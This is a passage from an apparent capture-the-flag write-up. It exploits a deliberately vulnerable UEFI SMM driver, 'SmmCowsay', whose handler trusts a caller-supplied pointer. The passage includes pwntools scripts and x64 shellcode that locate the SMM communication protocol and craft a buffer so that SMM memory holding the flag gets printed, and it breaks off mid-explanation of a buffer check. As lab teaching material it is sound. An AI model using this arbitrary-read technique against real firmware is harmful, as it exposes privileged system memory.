<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">    *</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">CONST CHAR16 </span><span style="color:#CB7676">**</span><span style="color:#666666">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">Buffer</span><span style="color:#CB7676">-></span><span style="color:#DBD7CAEE">Data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Message</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>In this case, the message being sent is simply a pointer, which is copied into
the <code>->Data</code> array member <em>as is</em>. In other words, <code>Binexec.efi</code> sends a pointer
to the string to print to <code>SmmCowsay.efi</code> through
<code>mSmmCommunication->Communicate</code>. If we take a look at <code>SmmCowsay.efi</code> handles
the pointer, we can see that it isn’t treated in any special way. It is simply
passed as is to the printing function:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">EFI_STATUS</span></span>
<span class="line"><span style="color:#DBD7CAEE">EFIAPI</span></span>
<span class="line"><span style="color:#80A665">SmmCowsayHandler</span><span style="color:#666666"> (</span></span>
<span class="line"><span style="color:#DBD7CAEE">    IN EFI_HANDLE  </span><span style="color:#BD976A">DispatchHandle</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">    IN CONST VOID  </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">Context         </span><span style="color:#BD976A">OPTIONAL</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">    IN OUT VOID    </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">CommBuffer      </span><span style="color:#BD976A">OPTIONAL</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">    IN OUT UINTN   </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">CommBufferSize  OPTIONAL</span></span>
<span class="line"><span style="color:#666666">    )</span></span>
<span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#80A665">    DEBUG</span><span style="color:#666666"> ((</span><span style="color:#DBD7CAEE">DEBUG_INFO</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SmmCowsay SmmCowsayHandler Enter</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#DBD7CAEE">CommBuffer </span><span style="color:#CB7676">||</span><span style="color:#CB7676"> !</span><span style="color:#DBD7CAEE">CommBufferSize </span><span style="color:#CB7676">||</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">CommBufferSize </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">CHAR16 </span><span style="color:#CB7676">*</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> EFI_SUCCESS</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">    Cowsay</span><span style="color:#666666">(</span><span style="color:#CB7676">*</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">CONST CHAR16 </span><span style="color:#CB7676">**</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE">CommBuffer</span><span style="color:#666666">);</span><span style="color:#758575DD"> // &#x3C;== pointer passed *as is* here</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">    DEBUG</span><span style="color:#666666"> ((</span><span style="color:#DBD7CAEE">DEBUG_INFO</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SmmCowsay SmmCowsayHandler Exit</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> EFI_SUCCESS</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>This means that we can pass an arbitrary pointer to the <code>SmmCowsay</code> driver, and
it will happily read memory at the given address for us, displaying it on the
console as if it was a NUL-terminated <code>CHAR16</code> string. If we build an
<code>EFI_SMM_COMMUNICATE_HEADER</code> with <code>->Data</code> containing the value <code>0x44440000</code> and
pass it to the SMM driver through <code>mSmmCommunication->Communicate</code>, we can get
it to print the flag for us!</p>
<p>But how do we get ahold of this “SmmCommunication” protocol to call its
<code>->Communicate()</code> method? Taking a look at the code in <code>Binexec.efi</code>,
<code>mSmmCommunication</code> is simply a pointer obtained passing the right GUID to
<code>BootServices->LocateProtocol()</code>, like this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">    Status </span><span style="color:#666666">=</span><span style="color:#BD976A"> gBS</span><span style="color:#CB7676">-></span><span style="color:#80A665">LocateProtocol</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#CB7676">        &#x26;</span><span style="color:#BD976A">gEfiSmmCommunicationProtocolGuid</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#4D9375">        NULL</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#666666">        (</span><span style="color:#DBD7CAEE">VOID </span><span style="color:#CB7676">**</span><span style="color:#666666">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">mSmmCommunication</span></span>
<span class="line"><span style="color:#666666">        );</span></span>
<span class="line"></span></code></pre>
<h2 id="exploitation">Exploitation</h2>
<p>All we need to do in order to get the flag is simply replicate exactly what the
<code>Binexec</code> driver is doing, passing a different pointer to <code>SmmCowsay</code> and let it
print the memory content to the console for us. In theory we could do everything
with a single piece of assembly, but since we have the ability to send multiple
pieces of code in a loop and observe the results, let’s split this into simpler
steps so that we can check if things are OK along the way.</p>
<h3 id="step-1-get-ahold-of-bootservices-locateprotocol">Step 1: get ahold of BootServices->LocateProtocol</h3>
<p>The <code>LocateProtocol</code> function is provided in the <code>BootServices</code> table (<code>gBS</code>),
of which we actually have a pointer in the <code>SystemTable</code>. We know the address of
<code>SystemTable</code> since it is printed to the console for us, though to be pedantic
this does not really matter since it is a fixed address and there isn’t any kind
of address randomization going on.</p>
<p>We need to get <code>SystemTable->BootServices->LocateProtocol</code>. In theory all
addresses are fixed in our working environment (both locally and remote) due to
no ASLR being applied by EDK2, so we <em>could</em> just get the address of any
function we need and do direct calls, but let’s do it the right way because (1)
we’ll actually learn something, (2) we’ll nonethless need it for the next
challenges and most importantly (3) <em>I did not think about it originally and I
already have the code to do it anyway :’)</em>.</p>
<p>We can get <code>LocateProtocol</code> pretty easily with a couple of MOV instructions. The
debug artifacts provided with the challenge files also include all the structure
definitions we need in the debug symbols, so we can check the DWARF info in
<code>handout/edk2_artifacts/Binexec.debug</code> to get the offsets of the fields. I’ll
use <a href="https://manned.org/pahole.1">the <code>pahole</code> utility</a> (from the <code>dwarves</code> Debian package) for
this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">$ pahole </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE">C EFI_SYSTEM_TABLE handout</span><span style="color:#CB7676">/</span><span style="color:#DBD7CAEE">edk2_artifacts</span><span style="color:#CB7676">/</span><span style="color:#DBD7CAEE">Binexec.debug</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">typedef</span><span style="color:#CB7676"> struct</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_TABLE_HEADER           Hdr</span><span style="color:#666666">;</span><span style="color:#758575DD">                  /*     0    24 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    CHAR16 </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">                   FirmwareVendor</span><span style="color:#666666">;</span><span style="color:#758575DD">       /*    24     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    UINT32                     FirmwareRevision</span><span style="color:#666666">;</span><span style="color:#758575DD">     /*    32     4 */</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">    /* XXX 4 bytes hole, try to pack */</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_HANDLE                 ConsoleInHandle</span><span style="color:#666666">;</span><span style="color:#758575DD">      /*    40     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_SIMPLE_TEXT_INPUT_PROTOCOL </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> ConIn</span><span style="color:#666666">;</span><span style="color:#758575DD">          /*    48     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_HANDLE                 ConsoleOutHandle</span><span style="color:#666666">;</span><span style="color:#758575DD">     /*    56     8 */</span></span>
<span class="line"><span style="color:#758575DD">    /* --- cacheline 1 boundary (64 bytes) --- */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> ConOut</span><span style="color:#666666">;</span><span style="color:#758575DD">        /*    64     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_HANDLE                 StandardErrorHandle</span><span style="color:#666666">;</span><span style="color:#758575DD">  /*    72     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> StdErr</span><span style="color:#666666">;</span><span style="color:#758575DD">        /*    80     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_RUNTIME_SERVICES </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">     RuntimeServices</span><span style="color:#666666">;</span><span style="color:#758575DD">      /*    88     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_BOOT_SERVICES </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">        BootServices</span><span style="color:#666666">;</span><span style="color:#758575DD">         /*    96     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    UINTN                      NumberOfTableEntries</span><span style="color:#666666">;</span><span style="color:#758575DD"> /*   104     8 */</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_CONFIGURATION_TABLE </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">  ConfigurationTable</span><span style="color:#666666">;</span><span style="color:#758575DD">   /*   112     8 */</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">    /* size: 120, cachelines: 2, members: 13 */</span></span>
<span class="line"><span style="color:#758575DD">    /* sum members: 116, holes: 1, sum holes: 4 */</span></span>
<span class="line"><span style="color:#758575DD">    /* last cacheline: 56 bytes */</span></span>
<span class="line"><span style="color:#666666">}</span><span style="color:#DBD7CAEE"> EFI_SYSTEM_TABLE</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>This tells us that <code>BootServices</code> is at offset 96 in <code>SystemTable</code> (type
<code>EFI_SYSTEM_TABLE</code>). Likewise we can look at <code>EFI_BOOT_SERVICES</code> to see that
<code>LocateProtocol</code> is at offset <code>320</code> in
<code>BootServices</code>.</p>
<p>Setting things up with Python and pwtools, the code needed is as follows:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># Little hack needed to disable pwntools from taking over the terminal with</span></span>
<span class="line"><span style="color:#758575DD"># ncurses and breaking the output if we do conn.interactive() since the remote</span></span>
<span class="line"><span style="color:#758575DD"># program outputs \r\n for newlines.</span></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> os</span></span>
<span class="line"><span style="color:#DBD7CAEE">os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">environ</span><span style="color:#666666">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">PWNLIB_NOTERM</span><span style="color:#C98A7D77">'</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">context</span><span style="color:#666666">(</span><span style="color:#BD976A">arch</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">chdir</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">handout/run</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./run.sh</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">chdir</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">../..</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Address of SystemTable: </span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">system_table </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#666666">(),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">SystemTable @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> system_table</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">system_table</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rax + 96]  /* SystemTable->BootServices */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rbx, qword ptr [rax + 64]  /* BootServices->AllocatePool */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, qword ptr [rax + 320] /* BootServices->LocateProtocol */</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">RBX: 0x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">AllocatePool </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvn</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span><span style="color:#758575DD"> # useful for later</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">RCX: 0x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">LocateProtocol </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvn</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">BootServices->AllocatePool   @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> AllocatePool</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">BootServices->LocateProtocol @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> LocateProtocol</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<h3 id="step-2-get-ahold-of-msmmcommunication-to-talk-to-smmcowsay">Step 2: get ahold of mSmmCommunication to talk to SmmCowsay</h3>
<p>In order to locate <code>mSmmCommunication</code> we need to pass a pointer to the protocol
GUID to <code>LocateProtocol</code>, and a pointer to the a location where the resulting
pointer should be stored. We already have a RWX area of memory available (the
one where our shellcode is written), so let’s use that. We normally wouldn’t,
but the patch <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code>
to EDK2 sets all entries of the page table to RWX so we’re good.</p>
<p>From disassembling any of the UEFI drivers, we can see that the calling
convention is <a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">Microsoft x64</a>, so arguments in RCX, RDX, R8, R9, then
stack.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># Taken from EDK2 source code (or opening Binexec.efi in a disassembler)</span></span>
<span class="line"><span style="color:#DBD7CAEE">gEfiSmmCommunicationProtocolGuid </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &#x26;protocol) */</span></span>
<span class="line"><span style="color:#C98A7D">    lea rcx, qword ptr [rip + guid]</span></span>
<span class="line"><span style="color:#C98A7D">    xor rdx, rdx</span></span>
<span class="line"><span style="color:#C98A7D">    lea r8, qword ptr [rip + protocol]</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">LocateProtocol</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    test rax, rax</span></span>
<span class="line"><span style="color:#C98A7D">    jnz fail</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rbx, qword ptr [rax]            /* mSmmCommunication->Communicate */</span></span>
<span class="line"><span style="color:#C98A7D">    ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">fail:</span></span>
<span class="line"><span style="color:#C98A7D">    ud2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">guid:</span></span>
<span class="line"><span style="color:#C98A7D">    .octa </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">gEfiSmmCommunicationProtocolGuid</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">protocol:</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">RAX: 0x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">mSmmCommunication </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvn</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">RBX: 0x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">Communicate </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvn</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">mSmmCommunication              @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> mSmmCommunication</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">mSmmCommunication->Communicate @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> Communicate</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<h3 id="step-3-kindly-ask-smmcowsay-to-print-the-flag-for-us">Step 3: kindly ask SmmCowsay to print the flag for us</h3>
<p>We can now craft a message for <code>SmmCowsay</code> containing a pointer to the flag and
let it print it for us by calling <code>mSmmCommunication->Communicate</code> with the
right arguments. We can see the layout of <code>EFI_SMM_COMMUNICATE_HEADER</code> using
<code>pahole</code> again, inspecting the UEFI Specification PDF, or looking at EDK2 source
code.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># Taken from 0003-SmmCowsay-Vulnerable-Cowsay.patch</span></span>
<span class="line"><span style="color:#DBD7CAEE">gEfiSmmCowsayCommunicationGuid </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">f79265547535a8b54d102c839a75cf12</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    /* Communicate(mSmmCommunication, &#x26;buffer, NULL) */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">mSmmCommunication</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    lea rdx, qword ptr [rip + buffer]</span></span>
<span class="line"><span style="color:#C98A7D">    xor r8, r8</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">Communicate</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    test rax, rax</span></span>
<span class="line"><span style="color:#C98A7D">    jnz fail</span></span>
<span class="line"><span style="color:#C98A7D">    ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">fail:</span></span>
<span class="line"><span style="color:#C98A7D">    ud2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">buffer:</span></span>
<span class="line"><span style="color:#C98A7D">    .octa </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">gEfiSmmCowsayCommunicationGuid</span><span style="color:#C99076">}</span><span style="color:#C98A7D"> /* Buffer->HeaderGuid */</span></span>
<span class="line"><span style="color:#C98A7D">    .quad 8                                /* Buffer->MessageLength */</span></span>
<span class="line"><span style="color:#C98A7D">    .quad 0x44440000                       /* Buffer->Data */</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># Check output to see if things work</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#666666">()</span></span>
<span class="line"></span></code></pre>
<p>Wait a second though. This code does not work!</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Running...</span></span>
<span class="line"><span>!!!! X64 Exception Type - 06(#UD - Invalid Opcode)  CPU Apic ID - 00000000 !!!!</span></span>
<span class="line"><span>RIP  - 000000000517D120, CS  - 0000000000000038, RFLAGS - 0000000000000286</span></span>
<span class="line"><span>RAX  - 800000000000000F, RCX - 00000000000000B2, RDX - 00000000000000B2</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span></span></span></code></pre>
<p>We hit the <code>ud2</code> in the <code>fail:</code> label and got a nice register dump, because
<code>Communicate</code> returned <code>0x800000000000000F</code>: which according to the UEFI Spec
(Appendix D - Status Codes) means <code>EFI_ACCESS_DENIED</code>.</p>
<p>Indeed there is a gotcha: even though the challenge author explicitly added an
EDK2 patch to mark all all memory as RWX in the SMM page table
(<code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code>), there is
still a sanity check being performed on the SMM communication buffer,
<a href="https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163">as we can see in EDK2 source code</a>, which errors out if the
buffer resides in untrusted or invalid memory regions (like the one used for our
shellcode). <em>Thanks to YiFei for pointing this out since I had not actually
